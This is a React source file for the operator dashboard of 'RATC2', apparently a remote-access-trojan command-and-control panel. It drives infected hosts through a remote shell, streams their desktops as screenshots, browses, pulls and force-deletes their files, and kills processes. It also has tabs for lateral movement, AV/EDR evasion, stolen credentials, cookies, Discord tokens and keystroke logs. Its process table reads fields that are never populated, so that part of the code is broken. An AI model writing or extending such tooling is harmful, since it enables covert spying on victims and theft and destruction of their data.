import * as React from "react"
import { useAgentStore } from '@/stores/agentStore'
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/Card'
import { Button } from '@/components/ui/Button'
import { Input } from '@/components/ui/Input'
import { Textarea } from '@/components/ui/Textarea'
import { ScrollArea } from '@/components/ui/ScrollArea'
import { cn } from '@/lib/utils'
import {
  Terminal,
  Camera,
  Download,
  Upload,
  Network,
  Shield,
  Bug,
  Settings,
  Shield as ShieldIcon,
  AlertTriangle,
  MoreVertical,
  SquarePen,
  Send,
  Trash2,
  RefreshCw,
  Play,
  Pause,
  Power,
  Copy,
  Search,
  Filter,
  ChevronUp,
  ChevronRight,
  ChevronDown,
  Minimize2,
  Maximize2,
  Split,
  X,
  Loader2,
  Image,
  FileText,
  Folder,
  File,
  Clock,
  Zap,
  Crown,
  User,
  Globe,
  Cpu,
  Database,
  Server,
  Wifi,
  WifiOff,
  Monitor,
  Lock,
} from "lucide-react"
import { formatDistanceToNow } from 'date-fns'
import { motion } from 'framer-motion'
import { api } from '@/services/api'
import { toast } from 'sonner'

interface AgentDetailContentProps {
  agentId: string
  mode: 'shell' | 'desktop' | 'screenshot' | 'files' | 'processes' | 'lateral' | 'evasion' | 'modules' | 'credentials' | 'cookies' | 'discord' | 'keystrokes'
}

/* ── Live Desktop: queues a screenshot task per tick, polls /api/tasks/:id,
   renders the returned base64 JPEG. Agent beacons are slow (sleep+jitter),
   so the cadence follows the agent's beacon window. ── */
function DesktopView({ agentId }: { agentId: string }) {
  const [img, setImg] = React.useState<string | null>(null)
  const [status, setStatus] = React.useState<'idle' | 'capturing' | 'waiting' | 'error'>('idle')
  const [error, setError] = React.useState<string>('')
  const [intervalS, setIntervalS] = React.useState(20)
  const [lastFrame, setLastFrame] = React.useState<string>('')
  const running = React.useRef(true)
  const imgRef = React.useRef<HTMLImageElement | null>(null)

  const captureOnce = React.useCallback(async () => {
    setStatus('capturing')
    try {
      const task: any = await api.takeScreenshot(agentId)
      const taskId = task?.id ?? task?.ID
      if (!taskId) throw new Error('no task id')
      setStatus('waiting')
      const deadline = Date.now() + Math.max(60, intervalS * 4) * 1000
      while (running.current && Date.now() < deadline) {
        await new Promise(r => setTimeout(r, 2500))
        const t: any = await api.getTask(taskId)
        const st = String(t?.status ?? t?.Status ?? '')
        const out: string = String(t?.result ?? t?.Output ?? '')
        if (st === 'completed' && out && out.length > 512) {
          setImg(`data:image/jpeg;base64,${out.replace(/\s/g, '')}`)
          setLastFrame(new Date().toLocaleTimeString())
          setStatus('idle')
          return
        }
        if (st === 'failed') throw new Error(t?.error || 'agent returned failure')
      }
      setStatus('idle')
    } catch (e: any) {
      setError(e?.message || 'capture failed')
      setStatus('error')
    }
  }, [agentId, intervalS])

  React.useEffect(() => {
    running.current = true
    captureOnce()
    const iv = setInterval(() => { if (running.current) captureOnce() }, intervalS * 1000)
    return () => { running.current = false; clearInterval(iv) }
  }, [captureOnce, intervalS])

  const zoom = () => { if (imgRef.current) imgRef.current.requestFullscreen?.() }

  return (
    <div className="h-full flex flex-col">
      <div className="flex items-center justify-between mb-4 gap-2 flex-wrap">
        <CardTitle className="flex items-center gap-2">
          <Monitor className="w-5 h-5 text-accent-400" />
          Live Desktop
        </CardTitle>
        <div className="flex items-center gap-2">
          <select
            value={intervalS}
            onChange={(e) => setIntervalS(Number(e.target.value))}
            className="bg-dark-900 border border-dark-700 rounded-lg px-2 py-1 text-sm text-dark-200"
          >
            <option value={10}>Every 10s</option>
            <option value={20}>Every 20s</option>
            <option value={60}>Every 60s</option>
            <option value={300}>Every 5m</option>
          </select>
          <Button variant="outline" size="sm" onClick={captureOnce} disabled={status !== 'idle'}>
            {status === 'capturing' || status === 'waiting' ? <Loader2 className="w-4 h-4 animate-spin" /> : <Camera className="w-4 h-4 mr-2" />}
            Capture now
          </Button>
          {img && (
            <Button variant="ghost" size="sm" onClick={() => {
              const a = document.createElement('a')
              a.href = img; a.download = `desktop-${Date.now()}.jpg`; a.click()
            }}>
              <Download className="w-4 h-4 mr-2" /> Save
            </Button>
          )}
        </div>
      </div>
      <div className="flex-1 rounded-xl border border-dark-700 bg-dark-950/80 overflow-hidden relative flex items-center justify-center min-h-[420px]">
        {img ? (
          <>
            <img ref={imgRef} src={img} alt="agent desktop" onClick={zoom} className="max-w-full max-h-full object-contain cursor-zoom-in" />
            <div className="absolute bottom-3 left-3 flex items-center gap-2 px-3 py-1.5 rounded-full bg-dark-950/90 border border-dark-700 text-xs">
              <span className={cn("w-2 h-2 rounded-full", status === 'idle' ? 'bg-green-400 animate-pulse' : 'bg-yellow-400 animate-pulse')} />
              <span className="text-dark-300 font-mono">{status === 'idle' ? 'streaming' : status}</span>
              {lastFrame && <span className="text-dark-500 font-mono">last frame {lastFrame}</span>}
            </div>
          </>
        ) : (
          <div className="text-center text-dark-500 p-8">
            {status === 'error' ? (
              <><AlertTriangle className="w-10 h-10 mx-auto mb-3 text-red-400" /><p className="text-sm">{error}</p><p className="text-xs mt-2">The agent must beacon before it picks up the capture task — try a longer interval.</p></>
            ) : (
              <><Loader2 className="w-10 h-10 mx-auto mb-3 animate-spin text-accent-400" /><p className="text-sm">Waiting for agent to beacon and capture…</p></>
            )}
          </div>
        )}
      </div>
    </div>
  )
}

export function AgentDetailContent({ agentId, mode }: AgentDetailContentProps) {
  const { 
    tasks, 
    fileTransfers, 
    credentials, 
    cookies, 
    discordTokens, 
    keystrokes, 
    screenshots, 
    processes, 
    lateralMoves, 
    evasionResults, 
    modules,
    executeShell,
    takeScreenshot,
    suspendProcess,
    resumeProcess,
    killProcess,
    fetchTasks,
    fetchFileTransfers,
    fetchCredentials,
    fetchCookies,
    fetchDiscordTokens,
    fetchKeystrokes,
    fetchScreenshots,
    fetchProcesses,
    fetchLateralMoves,
    fetchEvasionResults,
    fetchModules,
  } = useAgentStore()

  const [command, setCommand] = React.useState('')
  const [commandHistory, setCommandHistory] = React.useState<string[]>([])
  const [historyIndex, setHistoryIndex] = React.useState(-1)
  const [output, setOutput] = React.useState<string>('')
  const [isExecuting, setIsExecuting] = React.useState(false)
  const [splitView, setSplitView] = React.useState(false)
  const [selectedScreenshot, setSelectedScreenshot] = React.useState<string | null>(null)
  const [filePath, setFilePath] = React.useState('/')
  const [searchTerm, setSearchTerm] = React.useState('')

  // Real file browser. Listings and deletes run through the agent's shell
  // channel; downloads create a transfer on the server and the agent pushes the
  // bytes back over /beacon. The old tab listed server-side transfer rows and
  // its download button had no handler at all, so nothing ever opened.
  type DirEntry = { name: string; isDir: boolean; size: number; modified: string }
  const [dirEntries, setDirEntries] = React.useState<DirEntry[]>([])
  const [listingBusy, setListingBusy] = React.useState(false)
  const [dirError, setDirError] = React.useState<string | null>(null)
  const [downloadIds, setDownloadIds] = React.useState<Record<string, string>>({})
  const [busyPath, setBusyPath] = React.useState<string | null>(null)
  const [procRows, setProcRows] = React.useState<Array<{ PID: number; Name: string; User: string }>>([])

  // Fetch data based on mode
  React.useEffect(() => {
    switch (mode) {
      case 'shell':
        fetchTasks(agentId)
        break
      case 'screenshot':
        fetchScreenshots(agentId)
        break
      case 'files':
        fetchFileTransfers(agentId)
        break
      case 'processes':
        fetchProcesses(agentId)
        break
      case 'lateral':
        fetchLateralMoves(agentId)
        break
      case 'evasion':
        fetchEvasionResults(agentId)
        break
      case 'modules':
        fetchModules(agentId)
        break
      case 'credentials':
        fetchCredentials(agentId)
        break
      case 'cookies':
        fetchCookies(agentId)
        break
      case 'discord':
        fetchDiscordTokens(agentId)
        break
      case 'keystrokes':
        fetchKeystrokes(agentId)
        break
    }
  }, [mode, agentId])

  const handleCommandSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!command.trim() || isExecuting) return
    
    setIsExecuting(true)
    setCommandHistory(prev => [command, ...prev].slice(0, 100))
    setHistoryIndex(-1)
    
    try {
      const task = await executeShell(agentId, command)
      setOutput(prev => prev + `\n$ ${command}\n${task.Output || 'Executing...'}\n`)
    } catch (error) {
      setOutput(prev => prev + `\n$ ${command}\nError: ${error instanceof Error ? error.message : 'Failed'}\n`)
    } finally {
      setIsExecuting(false)
      setCommand('')
    }
  }

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'ArrowUp') {
      e.preventDefault()
      if (historyIndex < commandHistory.length - 1) {
        setHistoryIndex(prev => prev + 1)
        setCommand(commandHistory[historyIndex + 1])
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault()
      if (historyIndex > 0) {
        setHistoryIndex(prev => prev - 1)
        setCommand(commandHistory[historyIndex - 1])
      } else if (historyIndex === 0) {
        setHistoryIndex(-1)
        setCommand('')
      }
    }
  }

  const renderShell = () => (
    <div className="h-full flex flex-col">
      {/* Terminal Output */}
      <ScrollArea className="flex-1 bg-dark-950 rounded-lg border border-dark-700 p-4 font-mono text-sm" style={{ fontFamily: 'JetBrains Mono, Fira Code, monospace' }}>
        <div className="text-green-400 mb-2">
          RATC2 Agent Shell - Connected to {agentId.slice(0, 8)}...
        </div>
        <div className="text-dark-400 mb-4">
          Type 'help' for available commands. Use ↑/↓ for history.
        </div>
        <pre className="whitespace-pre-wrap word-break-all text-dark-100">{output || 'Waiting for commands...'}</pre>
      </ScrollArea>
      
      {/* Command Input */}
      <div className="flex items-center gap-3 mt-4 p-3 bg-dark-900/50 rounded-lg border border-dark-700">
        <span className="text-green-400 font-mono">$</span>
        <form onSubmit={handleCommandSubmit} className="flex-1">
          <Input
            value={command}
            onChange={(e) => setCommand(e.target.value)}
            onKeyDown={handleKeyDown}
            placeholder="Enter command..."
            className="bg-transparent border-none focus-visible:ring-0 focus-visible:ring-offset-0 text-dark-100 placeholder-dark-500"
            disabled={isExecuting}
          />
        </form>
        <Button type="submit" onClick={handleCommandSubmit} disabled={isExecuting || !command.trim()} size="sm">
          <Send className="w-4 h-4" />
        </Button>
        <Button variant="outline" size="sm" onClick={() => setSplitView(!splitView)} className="ml-2">
          <Split className="w-4 h-4" />
        </Button>
      </div>

      {/* Screenshot Preview in Split View */}
      {splitView && selectedScreenshot && (
        <div className="mt-4 relative">
          <div className="flex items-center justify-between mb-2">
            <span className="text-sm font-medium text-dark-300">Screenshot Preview</span>
            <Button variant="ghost" size="icon" onClick={() => setSplitView(false)}>
              <X className="w-4 h-4" />
            </Button>
          </div>
          <div className="relative bg-dark-950 rounded-lg border border-dark-700 overflow-hidden">
            <img 
              src={`data:image/png;base64,${selectedScreenshot}`} 
              alt="Screenshot" 
              className="w-full h-[300px] object-contain"
            />
          </div>
        </div>
      )}
    </div>
  )

  const renderScreenshots = () => (
    <div className="h-full flex flex-col">
      <div className="flex items-center justify-between mb-4">
        <CardTitle className="flex items-center gap-2">
          <Camera className="w-5 h-5 text-accent-400" />
          Screenshots
        </CardTitle>
        <div className="flex items-center gap-2">
          <Button variant="outline" size="sm" onClick={() => takeScreenshot(agentId)}>
            <Camera className="w-4 h-4 mr-2" />
            Take Screenshot
          </Button>
          <Button variant="outline" size="sm" onClick={() => fetchScreenshots(agentId)}>
            <RefreshCw className="w-4 h-4" />
          </Button>
        </div>
      </div>
      
      {screenshots.length === 0 ? (
        <div className="flex-1 flex items-center justify-center">
          <Card className="card-hover text-center p-8">
            <Camera className="w-16 h-16 text-dark-600 mx-auto mb-4" />
            <h3 className="text-lg font-medium text-dark-300 mb-1">No screenshots yet</h3>
            <p className="text-dark-500 mb-4">Take a screenshot to get started</p>
            <Button onClick={() => takeScreenshot(agentId)} size="lg">
              <Camera className="w-4 h-4 mr-2" />
              Take Screenshot
            </Button>
          </Card>
        </div>
      ) : (
        <ScrollArea className="flex-1">
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
            {screenshots.map((screenshot) => (
              <motion.div
                key={screenshot.ID}
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                className="group relative bg-dark-900/50 rounded-lg border border-dark-700 overflow-hidden cursor-pointer transition-all hover:border-accent-500/30"
                onClick={() => setSelectedScreenshot(screenshot.Data)}
              >
                <div className="aspect-video relative overflow-hidden">
                  <img 
                    src={`data:image/png;base64,${screenshot.Data}`} 
                    alt={`Screenshot ${screenshot.ID.slice(0, 8)}`}
                    className="w-full h-full object-cover transition-transform duration-300 group-hover:scale-105"
                  />
                  <div className="absolute inset-0 bg-gradient-to-t from-black/80 to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
                    <div className="absolute bottom-3 left-3 right-3 flex justify-between">
                      <span className="text-xs text-dark-300 bg-dark-900/80 px-2 py-1 rounded">
                        {formatDistanceToNow(new Date(screenshot.Timestamp), { addSuffix: true })}
                      </span>
                      <Button variant="ghost" size="icon" className="text-accent-400">
                        <Maximize2 className="w-4 h-4" />
                      </Button>
                    </div>
                  </div>
                </div>
                <div className="p-3 border-t border-dark-700">
                  <p className="text-xs text-dark-400 font-mono truncate">{screenshot.ID}</p>
                  <p className="text-xs text-dark-500">{screenshot.Width}x{screenshot.Height}</p>
                </div>
              </motion.div>
            ))}
          </div>
        </ScrollArea>
      )}
    </div>
  )

  const pollTask = async (id: string, timeoutMs: number) => {
    const started = Date.now()
    while (Date.now() - started < timeoutMs) {
      await new Promise(r => setTimeout(r, 700))
      try {
        const t: any = await api.getTask(id)
        const st = t?.status ?? t?.Status
        if (st === 'completed' || st === 'failed') {
          return { status: String(st), output: String(t?.result ?? t?.Output ?? '') }
        }
      } catch { /* keep polling */ }
    }
    return null
  }

  const openDir = async (path: string) => {
    if (!path.trim()) return
    setListingBusy(true); setDirError(null)
    try {
      const q = path.replace(/'/g, "''")
      const ps = `powershell -nop -c "Get-ChildItem -LiteralPath '${q}' -Force | ForEach-Object { [pscustomobject]@{ n=$_.Name; d=$_.PSIsContainer; s=$_.Length; t=$_.LastWriteTime.ToString('o') } } | ConvertTo-Json -Compress"`
      const task: any = await executeShell(agentId, ps)
      const done = await pollTask(task?.ID ?? task?.id, 25000)
      if (!done) { setDirError('listing timed out — the agent has to be beaconing to browse'); return }
      if (done.status === 'failed') { setDirError('listing failed on the host'); return }
      const raw = done.output.trim()
      setFilePath(path)
      if (!raw) { setDirEntries([]); return }
      const parsed = JSON.parse(raw)
      const arr = Array.isArray(parsed) ? parsed : [parsed]
      setDirEntries(
        arr
          .map((e: any) => ({
            name: String(e?.n ?? ''),
            isDir: !!e?.d,
            size: Number(e?.s) || 0,
            modified: String(e?.t ?? ''),
          }))
          .filter((e: DirEntry) => e.name)
          .sort((a: DirEntry, b: DirEntry) => (a.isDir === b.isDir ? a.name.localeCompare(b.name) : a.isDir ? -1 : 1))
      )
    } catch (err) {
      setDirError(err instanceof Error ? err.message : 'listing failed')
    } finally {
      setListingBusy(false)
    }
  }

  const startDownload = async (remotePath: string) => {
    setBusyPath(remotePath); setDirError(null)
    try {
      const res: any = await api.downloadFile(agentId, remotePath)
      const ft = res?.file_transfer ?? res
      const id = ft?.ID ?? ft?.id
      if (!id) throw new Error('server returned no transfer id')
      setDownloadIds(prev => ({ ...prev, [remotePath]: id }))
      toast.success('Pull started', { description: remotePath })
      setTimeout(() => { void fetchFileTransfers(agentId) }, 1500)
    } catch (err) {
      const m = err instanceof Error ? err.message : 'download failed'
      setDirError(m)
      toast.error('Download failed', { description: m })
    } finally {
      setBusyPath(null)
    }
  }

  const deleteRemote = async (remotePath: string) => {
    if (!window.confirm(`Delete ${remotePath} on the host?`)) return
    setBusyPath(remotePath)
    try {
      await executeShell(agentId, `del /f /q "${remotePath}"`)
      toast.success('Delete queued', { description: remotePath })
      setTimeout(() => { void openDir(filePath) }, 1500)
    } catch (err) {
      toast.error('Delete failed', { description: err instanceof Error ? err.message : undefined })
    } finally {
      setBusyPath(null)
    }
  }

  const parentPath = (p: string) => {
    const norm = p.replace(/\\+$/, '')
    const idx = norm.lastIndexOf('\\')
    if (idx < 0) return p
    if (idx <= 1) return norm.slice(0, idx + 1)
    return norm.slice(0, idx)
  }

  const joinPath = (base: string, name: string) =>
    base.endsWith('\\') ? `${base}${name}` : `${base}\\${name}`

  const renderFiles = () => (
    <div className="h-full flex flex-col">
      <div className="flex items-center justify-between mb-4">
        <CardTitle className="flex items-center gap-2">
          <Folder className="w-5 h-5 text-accent-400" />
          File Browser
        </CardTitle>
        <div className="flex items-center gap-2">
          <Button variant="outline" size="sm" onClick={() => void openDir(filePath)} disabled={listingBusy}>
            <RefreshCw className={cn("w-4 h-4", listingBusy && "animate-spin")} />
            List
          </Button>
        </div>
      </div>

      {/* Path Navigation */}
      <div className="flex items-center gap-2 mb-4 p-3 bg-dark-900/50 rounded-lg border border-dark-700">
        <Button variant="ghost" size="sm" onClick={() => void openDir(parentPath(filePath))} title="Up one level">
          <ChevronUp className="w-4 h-4" />
        </Button>
        <Folder className="w-4 h-4 text-dark-400 shrink-0" />
        <Input
          value={filePath}
          onChange={(e) => setFilePath(e.target.value)}
          onKeyDown={(e) => e.key === 'Enter' && openDir(filePath)}
          placeholder="C:\Users"
          className="bg-transparent border-none focus-visible:ring-0 focus-visible:ring-offset-0 flex-1 text-dark-100 placeholder-dark-500"
        />
        <Button variant="outline" size="sm" onClick={() => void openDir(filePath)} disabled={listingBusy}>
          Go
        </Button>
      </div>

      {dirError && (
        <div className="mb-3 px-3 py-2 rounded-lg bg-red-500/10 border border-red-500/20 text-xs text-red-300">
          {dirError}
        </div>
      )}

      {listingBusy ? (
        <div className="flex-1 flex items-center justify-center">
          <div className="text-center">
            <Loader2 className="w-8 h-8 mx-auto mb-3 animate-spin text-accent-400" />
            <p className="text-sm text-dark-400">Listing {filePath}…</p>
          </div>
        </div>
      ) : dirEntries.length === 0 ? (
        <div className="flex-1 flex items-center justify-center">
          <Card className="card-hover text-center p-8">
            <FileText className="w-16 h-16 text-dark-600 mx-auto mb-4" />
            <h3 className="text-lg font-medium text-dark-300 mb-1">Nothing listed yet</h3>
            <p className="text-dark-500 mb-4">Enter a path and press Go — e.g. C:\Users</p>
            <Button variant="outline" size="sm" onClick={() => void openDir('C:\\')}>List C:\</Button>
          </Card>
        </div>
      ) : (
        <ScrollArea className="flex-1">
          <div className="space-y-1">
            {dirEntries.map((file) => {
              const full = joinPath(filePath, file.name)
              const transferId = downloadIds[full]
              return (
                <motion.div
                  key={full}
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  className="flex items-center gap-3 p-3 bg-dark-900/50 rounded-lg border border-dark-700 hover:border-accent-500/30 transition-all"
                >
                  <div className={cn("p-2 rounded-lg", file.isDir ? 'bg-yellow-500/10' : 'bg-blue-500/10')}>
                    {file.isDir ? <Folder className="w-5 h-5 text-yellow-400" /> : <File className="w-5 h-5 text-blue-400" />}
                  </div>
                  <button
                    className="flex-1 min-w-0 text-left"
                    onClick={() => file.isDir && void openDir(full)}
                    title={full}
                  >
                    <p className="font-medium text-dark-100 truncate">{file.name}</p>
                    <p className="text-xs text-dark-500 font-mono truncate">{full}</p>
                  </button>
                  <div className="flex items-center gap-2 text-xs text-dark-500 shrink-0">
                    {!file.isDir && <span className="font-mono">{(file.size / 1024).toFixed(1)} KB</span>}
                    {file.modified && <span>{new Date(file.modified).toLocaleString()}</span>}
                  </div>
                  <div className="flex items-center gap-1 shrink-0">
                    {!file.isDir && (
                      transferId ? (
                        <a href={api.fileDownloadUrl(transferId)} download={file.name}>
                          <Button variant="ghost" size="icon" className="h-8 w-8 text-green-400" title="Save the pulled file">
                            <Download className="w-4 h-4" />
                          </Button>
                        </a>
                      ) : (
                        <Button
                          variant="ghost" size="icon"
                          className="h-8 w-8 text-dark-400 hover:text-accent-400"
                          disabled={busyPath === full}
                          onClick={() => void startDownload(full)}
                          title="Pull this file from the host"
                        >
                          {busyPath === full ? <Loader2 className="w-4 h-4 animate-spin" /> : <Download className="w-4 h-4" />}
                        </Button>
                      )
                    )}
                    <Button
                      variant="ghost" size="icon"
                      className="h-8 w-8 text-dark-400 hover:text-red-400"
                      disabled={busyPath === full}
                      onClick={() => void deleteRemote(full)}
                      title="Delete on the host"
                    >
                      <Trash2 className="w-4 h-4" />
                    </Button>
                  </div>
                </motion.div>
              )
            })}
          </div>
        </ScrollArea>
      )}

      {fileTransfers.length > 0 && (
        <div className="mt-4 pt-4 border-t border-dark-800">
          <p className="text-xs uppercase tracking-wide text-dark-500 mb-2">Transfers</p>
          <div className="space-y-1">
            {fileTransfers.slice(0, 6).map((t) => (
              <div key={t.ID} className="flex items-center gap-3 px-3 py-2 rounded-lg bg-dark-900/40 border border-dark-800 text-sm">
                <span className="flex-1 min-w-0 truncate font-mono text-dark-300">{t.Path}</span>
                <span className={cn(
                  "px-2 py-0.5 rounded-full text-xs font-medium",
                  t.Status === 'completed' ? 'bg-green-500/20 text-green-400'
                    : t.Status === 'failed' ? 'bg-red-500/20 text-red-400'
                      : 'bg-yellow-500/20 text-yellow-400'
                )}>
                  {t.Status}
                </span>
                {t.Status === 'completed' && (
                  <a href={api.fileDownloadUrl(t.ID)} download>
                    <Button variant="ghost" size="sm" className="h-7 px-2 text-accent-400">
                      <Download className="w-3.5 h-3.5 mr-1" />
                      Save
                    </Button>
                  </a>
                )}
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  )

  const loadProcesses = async () => {
    setListingBusy(true); setDirError(null)
    try {
      const ps = `powershell -nop -c "Get-Process | ForEach-Object { [pscustomobject]@{ pid=$_.Id; name=$_.ProcessName; path=$_.Path } } | ConvertTo-Json -Compress"`
      const task: any = await executeShell(agentId, ps)
      const done = await pollTask(task?.ID ?? task?.id, 25000)
      if (!done) { setDirError('process list timed out — the agent has to be beaconing'); return }
      const raw = done.output.trim()
      if (!raw) { setProcRows([]); return }
      const parsed = JSON.parse(raw)
      const arr = Array.isArray(parsed) ? parsed : [parsed]
      setProcRows(arr.map((p: any) => ({
        PID: Number(p?.pid ?? 0),
        Name: String(p?.name ?? ''),
        User: String(p?.path ?? ''),
      })).filter((p: any) => p.Name))
    } catch (err) {
      setDirError(err instanceof Error ? err.message : 'process list failed')
    } finally {
      setListingBusy(false)
    }
  }

  const renderProcesses = () => {
    const filteredProcesses = procRows.filter(p =>
      p.Name.toLowerCase().includes(searchTerm.toLowerCase()) ||
      p.PID.toString().includes(searchTerm) ||
      p.User.toLowerCase().includes(searchTerm.toLowerCase())
    )
    return (
    <div className="h-full flex flex-col">
      <div className="flex items-center justify-between mb-4">
        <CardTitle className="flex items-center gap-2">
          <Network className="w-5 h-5 text-accent-400" />
          Processes
        </CardTitle>
        <div className="flex items-center gap-2">
          <Input
            placeholder="Search processes..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-64"
          />
          <Button variant="outline" size="sm" onClick={() => void loadProcesses()} disabled={listingBusy}>
            <RefreshCw className={cn("w-4 h-4", listingBusy && "animate-spin")} />
          </Button>
        </div>
      </div>

      {filteredProcesses.length === 0 ? (
        <div className="flex-1 flex items-center justify-center">
          <Card className="card-hover text-center p-8">
            <Network className="w-16 h-16 text-dark-600 mx-auto mb-4" />
            <h3 className="text-lg font-medium text-dark-300 mb-1">No processes found</h3>
            <p className="text-dark-500 mb-4">Refresh to load process list</p>
          </Card>
        </div>
      ) : (
        <ScrollArea className="flex-1">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="text-left text-dark-400 border-b border-dark-700">
                  <th className="pb-3 font-mono">PID</th>
                  <th className="pb-3">Name</th>
                  <th className="pb-3 font-mono">PPID</th>
                  <th className="pb-3">User</th>
                  <th className="pb-3 font-mono">CPU %</th>
                  <th className="pb-3 font-mono">Memory</th>
                  <th className="pb-3">Status</th>
                  <th className="pb-3">Actions</th>
                </tr>
              </thead>
              <tbody>
                {filteredProcesses.map((proc) => (
                  <tr key={proc.PID} className="border-b border-dark-800 hover:bg-dark-800/50 transition-colors">
                    <td className="py-3 font-mono text-dark-300">{proc.PID}</td>
                    <td className="py-3 text-dark-100 truncate max-w-[200px]">{proc.Name}</td>
                    <td className="py-3 font-mono text-dark-400">{proc.PPID}</td>
                    <td className="py-3 text-dark-400">{proc.User}</td>
                    <td className="py-3 font-mono text-dark-400">{proc.CPU.toFixed(1)}%</td>
                    <td className="py-3 font-mono text-dark-400">{(proc.Memory / 1024 / 1024).toFixed(1)} MB</td>
                    <td className="py-3">
                      <span className={cn(
                        "px-2 py-0.5 rounded-full text-xs font-medium",
                        proc.Status === 'running' ? 'bg-green-500/20 text-green-400' :
                        'bg-yellow-500/20 text-yellow-400'
                      )}>
                        {proc.Status}
                      </span>
                    </td>
                    <td className="py-3">
                      <div className="flex items-center gap-1">
                        <Button variant="ghost" size="icon" className="h-8 w-8 text-yellow-400 hover:bg-yellow-500/10" onClick={() => suspendProcess(agentId, proc.PID)} title="Suspend">
                          <Pause className="w-4 h-4" />
                        </Button>
                        <Button variant="ghost" size="icon" className="h-8 w-8 text-green-400 hover:bg-green-500/10" onClick={() => resumeProcess(agentId, proc.PID)} title="Resume">
                          <Play className="w-4 h-4" />
                        </Button>
                        <Button variant="ghost" size="icon" className="h-8 w-8 text-red-400 hover:bg-red-500/10" onClick={() => killProcess(agentId, proc.PID)} title="Kill">
                          <Power className="w-4 h-4" />
                        </Button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </ScrollArea>
      )}
    </div>
    )
  }

  const renderPlaceholder = (title: string, icon: React.ReactNode, description: string) => (
    <div className="h-full flex items-center justify-center">
      <Card className="card-hover text-center p-8 max-w-md">
        <div className="text-accent-400 mb-4">{icon}</div>
        <h3 className="text-lg font-medium text-dark-300 mb-1">{title}</h3>
        <p className="text-dark-500 mb-4">{description}</p>
        <Button variant="outline" size="sm">
          <RefreshCw className="w-4 h-4 mr-2" />
          Refresh
        </Button>
      </Card>
    </div>
  )

  const renderContent = () => {
    switch (mode) {
      case 'shell':
        return renderShell()
      case 'desktop':
        return <DesktopView agentId={agentId} />
      case 'screenshot':
        return renderScreenshots()
      case 'files':
        return renderFiles()
      case 'processes':
        return renderProcesses()
      case 'lateral':
        return renderPlaceholder('Lateral Movement', <Bug className="w-16 h-16" />, 'Network pivoting and scanning capabilities')
      case 'evasion':
        return renderPlaceholder('Evasion Techniques', <Shield className="w-16 h-16" />, 'AV/EDR bypass methods and results')
      case 'modules':
        return renderPlaceholder('Modules', <Settings className="w-16 h-16" />, 'Load/unload capability modules')
      case 'credentials':
        return renderPlaceholder('Credentials', <ShieldIcon className="w-16 h-16" />, 'Extracted browser and system credentials')
      case 'cookies':
        return renderPlaceholder('Cookies', <AlertTriangle className="w-16 h-16" />, 'Browser session cookies')
      case 'discord':
        return renderPlaceholder('Discord Tokens', <MoreVertical className="w-16 h-16" />, 'Discord authentication tokens')
      case 'keystrokes':
        return renderPlaceholder('Keystrokes', <SquarePen className="w-16 h-16" />, 'Captured keystroke logs')
      default:
        return renderPlaceholder('Unknown', <Terminal className="w-16 h-16" />, 'Unknown mode')
    }
  }

  return (
    <div className="h-full">
      {renderContent()}
    </div>
  )
}